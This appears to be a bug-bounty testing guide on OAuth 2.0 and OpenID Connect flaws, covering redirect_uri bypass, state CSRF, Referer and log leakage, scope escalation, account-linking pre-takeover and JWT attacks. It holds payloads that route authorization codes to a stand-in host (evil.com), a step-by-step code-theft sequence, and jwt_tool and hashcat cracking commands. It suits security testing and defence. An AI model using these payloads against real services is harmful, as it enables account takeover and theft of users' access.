# OAuth 2.0 / OpenID Connect Vulnerabilities

**CWE:** CWE-287, CWE-601 | Severity: Critical when exploited for ATO

> OAuth bugs are among the most impactful in bug bounty — a single misconfiguration can lead to account takeover on any user without interaction.

---

## OAuth Flow Fundamentals

```
Client → Authorization Server: "I want access on behalf of user"
Authorization Server → User: "Do you approve?"
User → Authorization Server: "Yes"
Authorization Server → Client: authorization_code (or token)
Client → Resource Server: "Here's my token, give me the data"
```

**Key parameters to test:**
- `client_id` — identifies the app
- `redirect_uri` — where the code/token is sent after auth
- `response_type` — `code` (authorization code) or `token` (implicit)
- `scope` — what permissions are requested
- `state` — CSRF prevention token

---

## 1. redirect_uri Manipulation

The most impactful OAuth bug. If the auth server doesn't strictly validate `redirect_uri`, an attacker can steal authorization codes.

```bash
# Strict match bypass attempts
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://target.com/callback%2F..%2Fevil
redirect_uri=https://target.com.evil.com/callback
redirect_uri=https://evil.com%23.target.com/callback   # fragment trick
redirect_uri=https://evil.com%3F.target.com/callback   # query trick

# Open redirect on same domain
# If /redirect?to=https://evil.com is an open redirect on target.com:
redirect_uri=https://target.com/redirect?to=https://evil.com

# Path traversal in redirect_uri
redirect_uri=https://target.com/callback/../../admin

# If wildcard allowed: *.target.com
redirect_uri=https://evil.target.com/callback   # if you control a subdomain

# Subdomain takeover + OAuth = full ATO
# Take over sub.target.com → use as redirect_uri → steal all auth codes
```

**Full exploitation:**

```
1. Craft URL: /oauth/authorize?...&redirect_uri=https://evil.com
2. Send to victim (phishing/CSRF)
3. Victim authorizes
4. Code lands at evil.com: https://evil.com/callback?code=AUTH_CODE
5. Exchange code for token: POST /oauth/token
   grant_type=authorization_code&code=AUTH_CODE&client_id=X&
   redirect_uri=https://evil.com&client_secret=SECRET
6. Use token to access victim's account
```

---

## 2. CSRF on OAuth (Missing state Parameter)

```bash
# Check if state parameter is present and validated
# 1. Start OAuth flow — copy authorization URL
# 2. Drop or modify the state parameter
# 3. If server accepts → CSRF on OAuth flow

# Exploitation:
# Attacker initiates OAuth flow → pauses after getting auth URL
# Attacker sends authorization URL to victim
# Victim clicks → authorizes under their account
# Code goes back to attacker's redirect_uri → attacker links victim's account
```

---

## 3. Authorization Code Interception via Referer

```bash
# The authorization code appears in redirect URL:
# https://target.com/callback?code=AUTH_CODE

# If the callback page loads external resources (images, scripts, analytics):
# The code leaks in the Referer header to those external origins

# Check:
# 1. Intercept the callback request in Burp
# 2. Look at subsequent requests — does code appear in Referer?
# 3. Also check: code in URL that gets logged by analytics (GA, Mixpanel)
```

---

## 4. Implicit Flow Token Theft

```bash
# Implicit flow: response_type=token
# Token is delivered in URL fragment: #access_token=TOKEN

# Risk: URL fragment can leak via:
# - Referer headers (if fragment is preserved — rare but happens)
# - Browser history
# - Open redirect: /oauth/authorize?response_type=token&redirect_uri=/redirect?to=attacker.com
#   Fragment may be forwarded depending on browser behavior
```

---

## 5. Token Leakage in Logs / History

```bash
# Check if access_token or code appears in:
# - Server-side access logs (URL parameters)
# - Browser history
# - Analytics platforms (check network tab)
# - Error pages that reflect full URL

# Some apps pass tokens as GET parameters — catastrophic for logging
GET /api/data?access_token=TOKEN  ← logs forever
```

---

## 6. Scope Upgrade / Privilege Escalation

```bash
# Test if you can request scopes beyond what's authorized
# Add admin scopes to the authorization request
scope=read+write+admin+delete
scope=user:read%20admin:all%20repo

# Check if scope validation is server-side
# Some servers grant all requested scopes without validating entitlement
```

---

## 7. Account Linking Abuse

```bash
# If app allows linking OAuth providers to existing accounts:
# 1. Attacker registers with email victim@example.com
# 2. Attacker links their Google OAuth account (attacker@gmail.com) to account
# 3. No verification that victim@example.com owns the Google account
# 4. Victim creates account later → can't because email is taken
#    OR attacker already has access to the victim's account profile

# Pre-account takeover flow:
# 1. Sign up with victim's email before victim does
# 2. Link OAuth identity
# 3. When victim eventually signs up via OAuth → logs into attacker-controlled account
```

---

## 8. JWT / Token Vulnerabilities in OAuth

```bash
# If access tokens are JWTs:
# Algorithm confusion (none / RS→HS)
# Weak secret brute force
# Missing exp claim
# Missing iss/aud validation

python3 jwt_tool.py TOKEN -X a   # none algorithm
python3 jwt_tool.py TOKEN -X k -pk public.pem   # RS→HS confusion

hashcat -a 0 -m 16500 token.jwt rockyou.txt   # brute force
```

---

## 9. Open Redirect Chains

```bash
# Pattern: OAuth redirect_uri must be on target.com
# Target.com has open redirect: /go?url=https://evil.com
# Chain: redirect_uri=https://target.com/go?url=https://evil.com
# Auth server sees: ✓ it's on target.com
# After auth: code delivered to https://evil.com via redirect chain
```

---

## Testing Checklist

- [ ] `redirect_uri` — strict validation? Test path traversal, open redirect chains, subdomain variants
- [ ] `state` parameter — present? Validated? Test CSRF without state
- [ ] Authorization code — reusable? Used after use → error?
- [ ] Implicit flow — token in fragment → Referer leak possible?
- [ ] Scope validation — can you request more than entitled?
- [ ] Account linking — pre-ATO via unverified email?
- [ ] Token storage — localStorage, sessionStorage, or cookies?
- [ ] JWT tokens — algorithm, expiry, signature validation
- [ ] PKCE — implemented? Verifier validated server-side?

---

## Impact

**redirect_uri bypass → authorization code theft** → Critical (full ATO on any user)

**CSRF on OAuth → account linking** → High

**Scope escalation** → High

**Token leakage via Referer** → Medium–High

**Pre-ATO via account linking** → High
